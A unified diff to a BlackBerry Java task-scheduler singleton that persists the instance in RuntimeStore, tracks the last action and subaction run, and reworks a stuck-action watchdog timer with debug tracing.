@@ -15,13 +15,16 @@ import java.util.Vector;
 
 import net.rim.device.api.system.Backlight;
 import net.rim.device.api.system.DeviceInfo;
+import net.rim.device.api.system.RuntimeStore;
 import blackberry.action.Action;
 import blackberry.action.SubAction;
+import blackberry.config.Keys;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.interfaces.Singleton;
 import blackberry.log.LogCollector;
 import blackberry.utils.Check;
+import blackberry.utils.DateTime;
 import blackberry.utils.Utils;
 
 // TODO: Auto-generated Javadoc
@@ -32,6 +35,7 @@ public final class Task implements Singleton {
 
     private static final int SLEEPING_TIME = 1000;
     private static final long APP_TIMER_PERIOD = 1000;
+    private static final long GUID = 0xefa4f28c0e0c8693L;
 
     /** The debug instance. */
     //#ifdef DEBUG
@@ -46,7 +50,13 @@ public final class Task implements Singleton {
      */
     public static synchronized Task getInstance() {
         if (instance == null) {
-            instance = new Task();
+            instance = (Task) RuntimeStore.getRuntimeStore().get(GUID);
+            if (instance == null) {
+                Task singleton = new Task();
+                RuntimeStore.getRuntimeStore().put(GUID, singleton);
+                instance = singleton;
+            }
+
         }
         return instance;
     }
@@ -95,7 +105,8 @@ public final class Task implements Singleton {
 
     Date lastActionCheckedStart;
     Date lastActionCheckedEnd;
-    int lastActionCheckedId;
+    String lastAction;
+    String lastSubAction;
 
     /**
      * Check actions.
@@ -121,9 +132,9 @@ public final class Task implements Singleton {
                     for (int k = 0; k < asize; ++k) {
                         final int actionId = actionIds[k];
 
-                        lastActionCheckedId = actionId;
-
                         final Action action = status.getAction(actionId);
+
+                        lastAction = action.toString();
 
                         if (action.isTriggered() == false) {
                             //#ifdef DEBUG
@@ -150,6 +161,8 @@ public final class Task implements Singleton {
                                         "checkActions: subAction!=null");
                                 //#endift
 
+                                lastSubAction = subAction.toString();
+
                                 final boolean ret = subAction.execute(action
                                         .getTriggeringEvent());
 
@@ -170,11 +183,13 @@ public final class Task implements Singleton {
                                     //#endif
                                     status.unTriggerAll();
                                     //#ifdef DEBUG_TRACE
-                                    debug.trace("checkActions: stopping agents");
+                                    debug
+                                            .trace("checkActions: stopping agents");
                                     //#endif
                                     agentManager.stopAll();
                                     //#ifdef DEBUG_TRACE
-                                    debug.trace("checkActions: stopping events");
+                                    debug
+                                            .trace("checkActions: stopping events");
                                     //#endif
                                     eventManager.stopAll();
                                     Utils.sleep(2000);
@@ -308,20 +323,45 @@ public final class Task implements Singleton {
         if (!Backlight.isEnabled()) {
             return true;
         }
-        
-        if (lastActionCheckedEnd != null && lastActionCheckedStart != null) {
-            long lastActionElapse = lastActionCheckedEnd.getTime()
+
+        if (lastActionCheckedStart != null) {
+
+            long timestamp = (new Date()).getTime();
+            long lastActionElapse = timestamp
                     - lastActionCheckedStart.getTime();
-            if (lastActionElapse > 60 * 1000) {
+
+            //#ifdef DEBUG_WARN
+            debug.warn("lastAction: " + lastAction + " lastSubAction: "
+                    + lastSubAction + " elapsed:" + lastActionElapse);
+            //#endif
+
+            
+            // se impiega piu' di cinque minuti
+            if (lastActionElapse > 1000 * 60 * 5) {
                 //#ifdef DEBUG_WARN
-                debug.warn("lastAction stuck by: " + lastActionCheckedId
-                        + " elapsed:" + lastActionCheckedId);
+                debug.warn("lastAction stuck in the middle");
                 //#endif
                 ret = false;
             }
-        }else{
+
+            if (lastActionCheckedEnd != null) {
+
+                long lastActionDifference = lastActionCheckedStart.getTime()
+                        - lastActionCheckedEnd.getTime();
+
+                // se e' passata piu' di un ora dall'ultimo check
+                if (lastActionDifference > 1000 * 60 * 5) {
+                    //#ifdef DEBUG_WARN
+                    debug.warn("lastAction stuck somewhere");
+                    //#endif
+                    ret = false;
+                }
+
+            }
+        } else {
             //#ifdef DEBUG_WARN
-            debug.warn("lastActionCheckedEnd || lastActionCheckedStart == null");
+            debug
+                    .warn("lastActionCheckedEnd || lastActionCheckedStart == null");
             //#endif
         }
 
@@ -340,8 +380,16 @@ public final class Task implements Singleton {
         }
 
         //#ifdef DEBUG_TRACE
-        debug.trace("verifyTimers: " + ret + " lastActionCheckedStart:" +lastActionCheckedStart);
+        debug.trace("verifyTimers: " + ret + " lastActionCheckedStart:"
+                + lastActionCheckedStart + " lastActionCheckedStop:"
+                + lastActionCheckedEnd);
         //#endif
+        
+        if(ret == false){
+            //#ifdef DEBUG_TRACE
+            debug.trace("verifyTimers: something wrong here");
+            //#endif
+        }
 
         return ret;
     }
